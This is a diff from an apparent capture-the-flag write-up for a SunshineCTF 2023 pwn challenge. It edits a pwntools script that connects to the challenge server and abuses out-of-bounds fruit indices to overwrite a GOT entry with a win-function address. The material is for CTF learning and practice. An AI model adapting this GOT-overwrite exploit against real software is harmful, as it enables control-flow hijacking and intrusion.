@@ -53,32 +53,24 @@ replace the print@got.plt-address with the address of the win-function:
 from pwn import p64
 from pwn import *
 
+context.log_level = 'debug'
 
-def print_n_send(p, payload):
-    print(payload)
-    p.sendline(payload)
-
-
-# p = process("./sunshine")
+#p = process("./sunshine")
 p = remote("chal.2023.sunshinectf.games", 23003)
-
-target_address = 0x405020
-fruits_base = 0x405080
-win_function_addr = 0x0040128F
-
-local_34_value = (target_address - fruits_base) // 8
-
-p.recvuntil(b"\n\n")
-print(p.recvuntil(b"Which fruit would you like to eat [0-3] >>> "))
-
-print_n_send(p, str.encode("10"))
+ 
+p.recvuntil(b"Which fruit would you like to eat [0-3] >>> ")
+p.send(str.encode("10\n")) # offset to printf_sym
 print(p.recvuntil(b"Type of new fruit >>>"))
-print_n_send(p, b"\x06\x00\x00\x00\x00\x00\x00\x00")
-print(p.recvuntil(b"Which fruit would you like to eat [0-3] >>> "))
-print_n_send(p, str(local_34_value).encode())
+p.send(b"\x06\x00\x00\x00\x00\x00\x00\x00") # 0x6
+p.send(str.encode("\n"))
+p.recvuntil(b"Which fruit would you like to eat [0-3] >>> ")
+p.send(str.encode("-12\n")) # offset to printf@got.plt
 print(p.recvuntil(b"Type of new fruit >>>"))
-print_n_send(p, p64(win_function_addr))
+p.send(b'\x8f\x12\x40\x00\x00\x00\x00\x00') # address of win
+p.send(str.encode("\n"))
 print(p.recv())
+print(p.recv())
+
 ```
 
 ![pwn](img9.png)
